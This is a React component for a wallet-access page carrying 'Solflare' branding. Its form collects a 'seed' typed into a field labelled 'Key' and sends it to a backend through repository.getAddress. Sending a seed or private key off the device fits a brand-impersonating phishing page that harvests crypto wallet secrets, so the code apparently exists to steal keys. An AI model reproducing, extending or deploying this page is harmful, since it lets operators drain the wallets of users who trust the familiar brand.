import React from 'react'
import Navbar from '../components/navbar1'
import { useHistory } from 'react-router-dom'
import Loading from '../components/LoadingAnimation'

import { Toast } from 'react-bootstrap'
import { Formik, Form } from 'formik';
import { useDispatch } from 'react-redux';
import { IoChevronBackOutline } from 'react-icons/io5'
import * as Yup from 'yup';
import { saveAddress } from '../redux/actionMethodes/User'
import { repository } from '../utiles/repository';

const DisplayingErrorMessagesSchema = Yup.object().shape({

    seed: Yup.string()
        .required('Required')
});
const Key= () => {
    const history = useHistory();
    const dispatch = useDispatch();
    const [message, setmessage] = React.useState("");
    const [showmessage, setshowmessage] = React.useState(false);
    const [showanimation, setshowanimation] = React.useState(false);

    const postKey = async (datapost) => {
        setshowanimation(true)

        const { data, status } = await repository.getAddress(datapost).then(x => x);
        console.log(data, status)
        if (status === 200) {
            dispatch(saveAddress(data.address));
             setshowanimation(false)
        }
        else {
            setshowanimation(false)
            setshowmessage(true);
            setmessage(data.message);
        }


    }
    return <div style={{ backgroundColor: '#f6f7fa', height: '100vh' }}>
{showmessage ? <Toast style={{
            position: 'fixed',
            top: 10,
            right: 10,
        }}>
            <Toast.Header onClick={() => setshowmessage(false)}>
                <img src="holder.js/20x20?text=%20" className="rounded mr-2" alt="" />
                <strong className="mr-auto">Solflare</strong>
            </Toast.Header>
            <Toast.Body>{message}</Toast.Body>
        </Toast> : <></>}
         {showanimation ? <Loading />
            : <></>}
        <Navbar  />
        <div className="container wallet-page d-flex justify-content-center text-center " style={{}}>
            <h4 className="mb-5">ACCESS WALLET
</h4>

            <p className="mt-5 ft-12px text-secondary-1">To access your wallet, please enter your password and upload your keystore file.
</p>

            <Formik
                initialValues={{
                    seed:"",
                    

                }}
                validationSchema={DisplayingErrorMessagesSchema}
                onSubmit={async (values, { setSubmitting }) => {
                    await postKey(values)

                }}
            >

                {({ errors, touched, getFieldProps, submitForm, setErrors, handleBlur, values, handleSubmit }) => {

                    return (
                        <Form>
                            <input {...getFieldProps("seed")} className="form-control" type="text" placeholder="Key" />
                            {touched.seed && errors.seed && <div style={{ color: 'red', marginTop: 10,textAlign:'left' }}>{errors.seed}</div>}

                            <div className="dsipas-34asf3 mt-5">
                                <button onClick={() => history.push('/')} className="btn btn-back"><IoChevronBackOutline />Back</button>
                                <button type="button" onClick={() => handleSubmit()} className="btn btn-lightin btn2" style={{ width: 135 }}>Access</button>
                            </div>
                        </Form>
                    )
                }}
            </Formik>

        </div>
    </div>
}

export default Key;